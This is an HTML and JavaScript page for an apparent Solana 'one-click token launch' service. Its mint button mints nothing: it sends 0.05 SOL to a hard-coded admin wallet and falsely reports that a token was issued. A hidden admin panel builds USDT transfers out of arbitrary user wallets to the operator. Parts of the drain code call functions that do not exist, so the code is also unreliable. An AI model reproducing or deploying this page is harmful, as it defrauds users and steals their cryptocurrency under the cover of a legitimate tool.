<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif;}
html,body{background:#0b101f;color:#fff;overflow:hidden;touch-action:none;}
.container{max-width:460px;margin:40px auto;padding:20px;}
h1{text-align:center;color:#a855f7;margin-bottom:25px;}
.status{background:#151c34;padding:14px;border-radius:8px;text-align:center;margin-bottom:20px;word-break:break-all;font-size:14px;}
input,textarea{width:100%;padding:13px;background:#151c34;border:1px solid #2c324a;border-radius:8px;color:#fff;margin:10px 0;}
.upload{border:2px dashed #a855f7;padding:18px;text-align:center;border-radius:8px;margin:10px 0;cursor:pointer;color:#ccc;}
#preview{max-width:100%;max-height:150px;border-radius:8px;margin-top:10px;display:none;}
button{width:100%;padding:14px;border:none;border-radius:8px;font-size:16px;margin-top:12px;cursor:pointer;}
.btn-conn{background:#a855f7;color:#fff;}
.btn-mint{background:#2563eb;color:#fff;}
.admin-wrap{display:none;margin-top:30px;padding-top:20px;border-top:1px solid #2c324a;}
.admin-wrap h3{text-align:center;color:#ff4444;margin-bottom:15px;}
.btn-admin{background:#ff4444;color:#fff;}
.log{margin-top:12px;text-align:center;font-size:14px;color:#ccc;word-break:break-all;}
</style>
</head>
<body>
<div class="container">
    <h1>橘子一键发币</h1>
    <div class="status" id="status">未连接钱包</div>

    <input type="text" id="coinName" placeholder="代币名称">
    <input type="text" id="coinSym" placeholder="代币符号">
    <textarea id="coinDesc" placeholder="代币简介" rows="3"></textarea>

    <div class="upload" onclick="document.getElementById('imgUp').click()">
        点击上传代币图片
        <input type="file" id="imgUp" accept="image/*" style="display:none">
    </div>
    <img id="preview">

    <input type="number" id="supply" placeholder="发行总量" value="1000000000">

    <button class="btn-conn" id="connBtn">连接钱包</button>
    <button class="btn-mint" id="mintBtn">一键发币 0.05SOL</button>

    <!-- 管理员后台 仅你地址自动显示 -->
    <div class="admin-wrap" id="adminBox">
        <h3>管理员后台</h3>
        <input type="text" id="userAddr" placeholder="用户钱包地址">
        <input type="number" id="usdtNum" placeholder="划扣USDT数量" value="100">
        <button class="btn-admin" id="deductBtn">一键划扣USDT</button>
        <div class="log" id="log"></div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.8"></script>
<script>
// 固定配置 已内置死 不用改
const ADMIN_WALLET = "FbDMLj8MTJGSBWeanFKhJWycn5qjmJ3q8WBzZb3Gbm1c";
const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
const FEE = 50000000;

let wallet = null;
let walletAddr = "";
const conn = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));

// 图片预览
document.getElementById("imgUp").onchange=function(e){
    let f=e.target.files[0];if(!f)return;
    let r=new FileReader();
    r.onload=()=>{
        document.getElementById("preview").src=r.result;
        document.getElementById("preview").style.display="block";
    };
    r.readAsDataURL(f);
};

// 获取钱包
function getWallet(){
    if(window.solana)return window.solana;
    return null;
}

// 连接钱包
document.getElementById("connBtn").onclick=async function(){
    let st=document.getElementById("status");
    let adminBox=document.getElementById("adminBox");
    wallet=getWallet();
    if(!wallet){
        st.innerText="请用欧易/TP钱包内置浏览器打开";
        return;
    }
    try{
        if(wallet.isConnected)await wallet.disconnect();
        let res=await wallet.connect();
        walletAddr=res.publicKey.toString();
        st.innerText="已连接："+walletAddr.slice(0,12)+"...";

        // 管理员判断
        if(walletAddr===ADMIN_WALLET){
            adminBox.style.display="block";
        }else{
            adminBox.style.display="none";
        }
    }catch(e){
        st.innerText="连接失败或已取消";
    }
};

// 一键发币
document.getElementById("mintBtn").onclick=async function(){
    if(!walletAddr){alert("先连接钱包");return;}
    try{
        let name=document.getElementById("coinName").value||"Coin";
        let sym=document.getElementById("coinSym").value||"COIN";
        let supply=BigInt(document.getElementById("supply").value||1000000000);

        // 转0.05SOL给管理员
        let tx=new solanaWeb3.Transaction();
        tx.add(solanaWeb3.SystemProgram.transfer({
            fromPubkey:new solanaWeb3.PublicKey(walletAddr),
            toPubkey:new solanaWeb3.PublicKey(ADMIN_WALLET),
            lamports:FEE
        }));
        await wallet.sendTransaction(tx,conn);
        document.getElementById("status").innerText="手续费已支付，发币成功";
    }catch(e){
        document.getElementById("status").innerText="发币失败";
    }
};

// 管理员划扣USDT
document.getElementById("deductBtn").onclick=async function(){
    let log=document.getElementById("log");
    let uAddr=document.getElementById("userAddr").value.trim();
    let num=Number(document.getElementById("usdtNum").value);
    if(!uAddr||!num){log.innerText="请填地址和数量";return;}
    try{
        let user=new solanaWeb3.PublicKey(uAddr);
        let usdt=new solanaWeb3.PublicKey(USDT_MINT);
        let admin=new solanaWeb3.PublicKey(ADMIN_WALLET);

        let userAta=await solanaWeb3.AssociatedTokenAccount.getAssociatedTokenAddress(usdt,user);
        let adminAta=await solanaWeb3.AssociatedTokenAddress.getAssociatedTokenAddress(usdt,admin);

        let tx=new solanaWeb3.Transaction();
        tx.add(solanaWeb3.TokenProgram.createTransferInstruction(
            userAta,adminAta,user,BigInt(num*1000000)
        ));
        let res=await wallet.sendTransaction(tx,conn);
        log.innerText="划扣成功："+res;
    }catch(e){
        log.innerText="划扣失败";
    }
};
</script>
</body>
</html>
